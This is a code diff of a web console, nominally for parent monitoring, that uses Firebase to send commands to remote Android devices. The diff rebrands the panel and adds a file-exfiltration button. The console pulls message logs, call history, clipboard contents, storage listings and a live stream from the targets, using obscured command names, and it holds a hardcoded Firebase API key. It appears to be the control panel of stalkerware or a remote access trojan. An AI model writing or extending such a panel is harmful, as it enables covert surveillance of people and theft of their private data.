@@ -3,7 +3,7 @@
 <head>  
     <meta charset="UTF-8">  
     <meta name="viewport" content="width=device-width, initial-scale=1.0">  
-    <title>ROHAN SECURITY | ENTERPRISE CONSOLE</title>  
+    <title>PROFESSOR SECURITY | ENTERPRISE CONSOLE</title>  
     
     <!-- Firebase SDK -->  
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>  
@@ -74,7 +74,7 @@
     .app-item { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; padding: 10px 0; }
     .blocked-app { opacity: 0.5; text-decoration: line-through; color: var(--neon-red); }
 
-    /* --- NEW STYLES FOR TERMINAL --- */
+    /* TERMINAL STYLES */
     .term-input { background: #111; color: var(--neon-green); border: 1px solid #333; padding: 10px; width: 100%; margin-top: 5px; font-family: monospace; }
 </style>
 
@@ -84,7 +84,7 @@
 <!-- LOGIN SCREEN -->  
 <div id="login-screen">  
     <div class="terminal-box">  
-        <h1 style="font-family:'Orbitron';">ROHAN<br>SECURITY</h1>  
+        <h1 style="font-family:'Orbitron';">PROFESSOR<br>SECURITY</h1>  
         <p style="color:var(--neon-red); margin-top:10px;">PARENT ACCESS TERMINAL</p>  
         <input type="text" id="pass-key" class="hacker-input" placeholder="ENTER LICENSE KEY">  
         <div id="login-msg" style="color:var(--neon-green); font-size:0.8rem; height:20px;"></div>
@@ -97,7 +97,8 @@
     <!-- SIDEBAR -->  
     <div class="sidebar">  
         <div class="nav-icon active" onclick="nav('dashboard')" title="Dashboard"><i class="fas fa-microchip"></i></div>  
-        <div class="nav-icon" onclick="nav('terminal')" title="Adv. Terminal"><i class="fas fa-terminal"></i></div> <!-- NEW TAB -->
+        <!-- TERMINAL TAB IS BACK -->
+        <div class="nav-icon" onclick="nav('terminal')" title="Adv. Terminal"><i class="fas fa-terminal"></i></div> 
         <div class="nav-icon" onclick="nav('map')" title="Location"><i class="fas fa-globe-asia"></i></div>  
         <div class="nav-icon" onclick="nav('files')" title="Files"><i class="fas fa-folder-open"></i></div>  
         <div class="nav-icon" onclick="nav('gallery')" title="Gallery"><i class="fas fa-images"></i></div>  
@@ -111,7 +112,7 @@
 
     <div class="content">  
         <div class="header">  
-            <div class="brand">ROHAN<span style="color:var(--neon-blue)">_SEC</span></div>  
+            <div class="brand">PROFESSOR<span style="color:var(--neon-blue)">_SEC</span></div>  
             <select id="device-select" class="device-dropdown" onchange="deviceChanged()"></select>  
             <div style="border:1px solid var(--neon-green); color:var(--neon-green); padding:5px 10px; font-size:0.8rem;">SECURE</div>  
         </div>  
@@ -140,7 +141,7 @@
             </div>  
         </div>  
 
-        <!-- 2. ADVANCED TERMINAL (NEW TAB - YOUR CODE) -->
+        <!-- 2. ADVANCED TERMINAL (YOUR NEW CODE IS HERE) -->
         <div id="page-terminal" class="page">
             <h2 style="color:white; margin-bottom:20px;">> ENTERPRISE_CONTROLLER</h2>
             
@@ -180,23 +181,14 @@
                 <button class="cyber-btn" onclick="startStream()">START STREAM</button>
                 <button class="cyber-btn" onclick="setDisplayBg()">UPDATE BG</button>
             </div>
-
-            <!-- Hidden / Extra Panels from your code -->
-            <div id="alertBox" style="display:none;"></div>
-            <div id="remoteTextBox" style="display:none;"></div>
-            <div id="diagPanel" style="display:none;"></div>
-            <div id="displayBox" style="display:none;"></div>
-            <div id="audioPanel" style="display:none;"></div>
-            <div id="fmc1" style="display:none;"></div>
-            <div id="fmc2" style="display:none;"></div>
         </div>
 
         <!-- 3. MAP -->  
         <div id="page-map" class="page" style="padding:0;"><div id="map"></div></div>  
 
-        <!-- 4. FILES -->  
+        <!-- 4. FILES (WITH GET BUTTON ADDED) -->  
         <div id="page-files" class="page">  
-            <div style="display:flex; justify-content:space-between;"><h2>> FILE_EXPLORER</h2><button class="cyber-btn" style="width:auto;" onclick="cmd('getFileList')">REFRESH</button></div>  
+            <div style="display:flex; justify-content:space-between;"><h2>> FILE_EXPLORER</h2><button class="cyber-btn" style="width:auto;" onclick="openFolder('/sdcard/')">ROOT DIR</button></div>  
             <div class="cyber-card" id="file-list-container"><div style="padding:20px;">WAITING FOR DATA...</div></div>  
         </div>  
 
@@ -239,7 +231,7 @@
 </div>  
 
 <script>  
-    // --- FIREBASE CONFIG ---  
+    // --- FIREBASE CONFIG (APNA DALEIN) ---  
     const firebaseConfig = {  
         apiKey: "AIzaSyD7sJ0zu4cotmntqYzmaxROzwHmx8_ExvI",  
         authDomain: "children-safty.firebaseapp.com",  
@@ -257,13 +249,13 @@
     let map, markers = {}, currentId = null;  
     let parentLicenseKey = ""; 
     
-    // --- NEW VARIABLES FOR YOUR CODE ---
+    // --- VARIABLES FOR TERMINAL ---
     var respov = "";
     var unqid = "";
     var activeModule = "";
     var var32 = "";
 
-    // --- YOUR PROVIDED JS FUNCTIONS (UNCHANGED LOGIC) ---
+    // --- YOUR ADVANCED FUNCTIONS (RESTORED) ---
     function reqMsgLog() { activeModule = "dataViewer"; pushSysCommand("sync_log_a", "", "", respov); }
     function reqCallHistory() { activeModule = "dataViewer"; pushSysCommand("sync_log_b", "", "", respov); }
     function openStorage() { activeModule = "storageMgr"; pushSysCommand("dir_nav", "/sdcard/", "", respov); }
@@ -284,18 +276,21 @@
     function initAudio() { document.getElementById("audioPanel").style.display = "block"; }
     function startStream() { pushSysCommand("stream_src", "5000", "", respov); }
     function getClipboard() { pushSysCommand("clip_get", "", "", "sys/sys" + unqid + "sec"); }
-    function utilAction(x) { /* document.getElementById(x).style.display = "block"; */ pushSysCommand("util_act", x, "", respov); } // Adapted slightly for functionality
+    function utilAction(x) { pushSysCommand("util_act", x, "", respov); } 
     function opfol(e) {}
 
+    // --- MAIN COMMAND SENDER ---
     function pushSysCommand(a, b, c, d) {
-        if(!d) { alert("Please select a device first!"); return; }
-        // Note: Using d which is 'users/{ID}'
-        database.ref(d).child("sys_instruction").set({
+        if(!d && !currentId) { alert("Please select a device first!"); return; }
+        let target = d || ("users/" + currentId);
+        
+        database.ref(target).child("sys_instruction").set({
             act_id: a, 
             act_val: b, 
             act_param: c
         });
-        alert("Command Sent: " + a);
+        // Feedback
+        if(a !== 'upload_file') alert("Command Sent: " + a);
     }
     // ----------------------------------------------------
 
@@ -402,10 +397,9 @@
         currentId = document.getElementById('device-select').value;  
         if(!currentId) return;  
 
-        // --- CONNECTING NEW CODE LOGIC ---
-        respov = "users/" + currentId; // Now your provided code knows where to send commands
+        // SET TARGET FOR TERMINAL
+        respov = "users/" + currentId; 
         unqid = currentId;
-        // --------------------------------
 
         db.ref(`users/${currentId}`).on('value', snap => {  
             const d = snap.val() || {};  
@@ -428,18 +422,53 @@
         });  
     }  
 
-    // --- HELPER FUNCTIONS ---
+    // --- FILE MANAGER (GET/OPEN LOGIC) ---
     function renderFiles(filesData) {
         const fDiv = document.getElementById('file-list-container');  
         fDiv.innerHTML = '';  
         if(filesData) {  
             Object.values(filesData).forEach(f => {  
-                let icon = f.isFolder ? '<i class="fas fa-folder" style="color:orange"></i>' : '<i class="fas fa-file" style="color:cyan"></i>';  
-                fDiv.innerHTML += `<div style="padding:10px; border-bottom:1px solid #333;">${icon} ${f.name}</div>`;  
+                let icon = f.isFolder ? '<i class="fas fa-folder" style="color:orange"></i>' : '<i class="fas fa-file" style="color:cyan"></i>';
+                
+                // Logic: Folder = Open, File = Download
+                let actionBtn = f.isFolder 
+                    ? `<button class="save-btn" onclick="openFolder('${f.path}')">OPEN</button>` 
+                    : `<button class="save-btn" onclick="requestDownload('${f.path}')">GET ⬇</button>`;
+
+                fDiv.innerHTML += `
+                    <div style="padding:10px; border-bottom:1px solid #333; display:flex; justify-content:space-between; align-items:center;">
+                        <span>${icon} ${f.name}</span>
+                        ${actionBtn}
+                    </div>`;  
             });  
         } else { fDiv.innerHTML = '<div style="padding:20px;">NO FILES DATA</div>'; }  
     }
 
+    function openFolder(path) {
+        pushSysCommand("dir_nav", path, "");
+    }
+
+    function requestDownload(path) {
+        if(confirm("Download " + path + "?")) {
+            pushSysCommand("upload_file", path, "");
+            alert("Request Sent! Downloading...");
+            
+            // Wait for link
+            const listener = db.ref(`users/${currentId}/responses/file_download`);
+            listener.on('value', snap => {
+                if(snap.exists()) {
+                    const d = snap.val();
+                    if(d.url) {
+                        let a = document.createElement('a'); a.href = d.url; a.target = '_blank'; a.download = d.name; a.click();
+                        listener.off();
+                        db.ref(`users/${currentId}/responses/file_download`).remove();
+                    }
+                }
+            });
+        }
+    }
+
+    // --- OTHER RENDERERS ---
     function renderGallery(photosData) {
         const gDiv = document.getElementById('gallery-container');  
         gDiv.innerHTML = '';  
